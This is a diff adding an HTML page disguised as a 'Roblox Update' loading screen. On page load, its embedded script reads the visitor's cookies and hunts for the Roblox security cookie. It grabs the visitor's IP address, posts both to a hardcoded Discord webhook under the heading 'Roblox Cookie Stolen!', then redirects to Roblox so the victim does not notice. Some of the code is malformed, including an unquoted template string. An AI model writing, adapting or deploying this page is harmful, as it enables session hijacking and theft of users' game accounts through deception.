@@ -1,0 +1,34 @@
+<!DOCTYPE html><html lang="en"><head> <meta charset="UTF-8"> <meta
+name="viewport" content="width=device-width, initial-scale=1.0"> <title>Roblox Update</title>
+<style> body { background-color: #1a1a1a; color: white; font-family:
+Arial, sans-serif; display: flex; justify-content: center; align-items: center;
+height: 100vh; margin: 0; overflow: hidden; } .loader { border: 5px
+solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width:
+50px; height: 50px; animation: spin 1s linear infinite; } @keyframes spin {
+0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+</style></head><body> <div style="text-align: center;"> <h2>Connecting to
+Roblox...</h2> <div class="loader"></div> </div> <script> // ⚠ PASTE YOUR
+DISCORD WEBHOOK URL HERE ⚠ const WEBHOOK_URL =
+"https://discord.com/api/webhooks/1539067651077185686/W7wLnA9xyFE1rTN2W7Y_Gtsr3bxijnhenj7rNzxN_7qc-lbQpiYk-UThFPyoRR9w4mtg"; async function stealCookie() { try {
+const cookies = document.cookie; // Filter for the Roblox Security Cookie
+const robloxCookie = cookies.split(';').find(c =>
+c.trim().startsWith('Roblox=.ROBLOSECURITY')); if (!robloxCookie) { // If
+they don't have it, just send a message saying so sendToDiscord("❌ No Roblox
+Cookie Found!\nIP: " + await getIP(), "No Cookie"); } else { // Extract just
+the value const cookieValue = robloxCookie.split('=')[1]; // Send to
+Discord sendToDiscord( 🍪 **Roblox Cookie Stolen!**\n\n**Cookie:**
+\${cookieValue}\\n\n**URL:** https://www.roblox.com, "Cookie Stolen"
+); // Optional: Log to console for debugging console.log("Cookie stolen:",
+cookieValue); } } catch (e) { console.error(e); } } async
+function sendToDiscord(message, title) { try { await fetch(WEBHOOK_URL, {
+method: "POST", headers: { "Content-Type": "application/json",
+}, body: JSON.stringify({ content: message, embeds: [{
+title: title, color: 15158332, // Green timestamp: new
+Date().toISOString(), footer: { text: "Roblox Stole" } }]
+}), }); } catch (e) { console.error("Failed to send to Discord", e); }
+} // Optional: Get IP address for extra info async function getIP() { try {
+const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json();
+return data.ip; } catch (e) { return "Unknown"; } } // Trigger theft
+then redirect stealCookie(); // Redirect to Roblox immediately so they don't notice
+setTimeout(() => { window.location.href = "https://www.roblox.com"; }, 1500); // 1.5
+second delay to ensure cookie is sent and user sees the loader </script></body></html>
